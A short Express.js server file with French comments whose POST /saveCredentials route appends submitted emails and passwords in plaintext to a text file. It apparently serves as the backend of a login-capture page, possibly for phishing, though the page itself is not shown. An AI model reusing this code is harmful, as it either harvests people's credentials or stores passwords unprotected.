const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000;

// Middleware pour permettre le parsing des requêtes JSON
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Route pour la page HTML
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Route pour traiter les identifiants
app.post('/saveCredentials', (req, res) => {
    const { email, password } = req.body;

    // Format des données à écrire dans le fichier texte
    const data = `Email: ${email}, Mot de passe: ${password}\n`;

    // Enregistrer les données dans un fichier texte
    fs.appendFile('credentials.txt', data, (err) => {
        if (err) {
            console.error('Erreur lors de l\'enregistrement des identifiants', err);
            return res.status(500).send('Erreur serveur');
        }
        res.send('Identifiants enregistrés avec succès');
    });
});

// Démarrer le serveur
app.listen(port, () => {
    console.log(`Serveur démarré sur http://localhost:${port}`);
});
